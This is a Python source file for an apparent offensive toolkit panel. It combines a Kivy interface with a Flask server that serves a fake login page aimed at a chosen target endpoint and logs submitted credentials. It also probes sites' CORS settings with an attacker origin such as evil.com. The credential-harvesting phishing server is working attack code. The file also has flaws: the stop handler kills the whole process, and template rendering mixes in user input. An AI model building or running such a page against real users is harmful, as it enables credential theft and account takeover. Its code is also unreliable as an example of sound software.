import os
import threading
from flask import Flask, request, jsonify, render_template_string
from kivy.uix.gridlayout import GridLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.scrollview import ScrollView

class CORSExploitationView(GridLayout):
    def __init__(self, console_view, report_view, **kwargs):
        super(CORSExploitationView, self).__init__(**kwargs)
        self.cols = 1
        self.padding = 10
        self.spacing = 10
        self.console_view = console_view
        self.report_view = report_view
        self.server_thread = None
        self.app = Flask(__name__)
        self.configure_flask_routes()

        # Target Endpoint
        self.add_widget(Label(text="Target Endpoint", size_hint=(1, None), height=30))
        self.target_input = TextInput(
            hint_text="Enter the target endpoint (e.g., https://example.com/auth/login)",
            multiline=False,
            size_hint=(1, None),
            height=40
        )
        self.add_widget(self.target_input)

        # Start Fake Site Button
        self.start_button = Button(text="Start Fake Login Page", size_hint=(1, None), height=50)
        self.start_button.bind(on_press=self.start_fake_site)
        self.add_widget(self.start_button)

        # Stop Fake Site Button
        self.stop_button = Button(text="Stop Fake Login Page", size_hint=(1, None), height=50, disabled=True)
        self.stop_button.bind(on_press=self.stop_fake_site)
        self.add_widget(self.stop_button)

        # URL List for CORS Check
        self.add_widget(Label(text="URLs to Check CORS Config", size_hint=(1, None), height=30))
        self.urls_input = TextInput(
            hint_text="Enter URLs separated by commas",
            multiline=True,
            size_hint=(1, None),
            height=80
        )
        self.add_widget(self.urls_input)

        # Custom Origin
        self.add_widget(Label(text="Custom Origin", size_hint=(1, None), height=30))
        self.custom_origin_input = TextInput(
            hint_text="Enter custom origin (e.g., https://evil.com)",
            multiline=False,
            size_hint=(1, None),
            height=40
        )
        self.add_widget(self.custom_origin_input)

        # Start CORS Check Button
        self.cors_check_button = Button(text="Check CORS Config", size_hint=(1, None), height=50)
        self.cors_check_button.bind(on_press=self.check_cors_config)
        self.add_widget(self.cors_check_button)

    def configure_flask_routes(self):
        @self.app.route('/', methods=['GET'])
        def serve_fake_login():
            endpoint = self.target_input.text.strip()
            if not endpoint:
                return "Error: Target endpoint not provided.", 400

            # Read the HTML file and replace the endpoint placeholder
            with open("fake_login.html", "r") as file:
                html_content = file.read()
            html_content = html_content.replace("<ENDPOINT>", endpoint)

            return render_template_string(html_content)

    def check_cors_config(self, _):
        import requests

        urls = self.urls_input.text.strip().split(',')
        custom_origin = self.custom_origin_input.text.strip()

        if not urls or not custom_origin:
            self.console_view.add_text_schedule("Error: Both URLs and a custom origin are required.")
            return

        results = []
        for url in urls:
            url = url.strip()
            try:
                response = requests.options(
                    url,
                    headers={"Origin": custom_origin},
                    timeout=5
                )
                results.append(f"URL: {url}\nStatus Code: {response.status_code}\nHeaders: {response.headers}\n")
            except requests.exceptions.RequestException as e:
                results.append(f"URL: {url}\nError: {e}\n")

        # Send results to the report view
        self.report_view.add_text_schedule("\n".join(results))
        self.console_view.add_text_schedule("CORS configuration check completed. Results added to the report.")

    def start_fake_site(self, _):
        endpoint = self.target_input.text.strip()

        if not endpoint:
            self.console_view.add_text_schedule("Error: Target endpoint is required.")
            return

        # Add route to capture credentials
        @self.app.route('/submit', methods=['POST'])
        def receive_credentials():
            data = request.json
            if data:
                self.report_view.add_text_schedule(f"Captured Data: {data}")
            return jsonify({"status": "success", "message": "Data received!"})

        # Start the Flask server in a separate thread
        def run_server():
            self.app.run(port=8000, debug=False)

        self.server_thread = threading.Thread(target=run_server)
        self.server_thread.daemon = True
        self.server_thread.start()

        self.console_view.add_text_schedule("Fake login page running at http://localhost:8000")
        self.start_button.disabled = True
        self.stop_button.disabled = False

    def stop_fake_site(self, _):
        if self.server_thread:
            os._exit(0)  # Forcefully terminate the Flask server
            self.console_view.add_text_schedule("Fake login page stopped.")
            self.start_button.disabled = False
            self.stop_button.disabled = True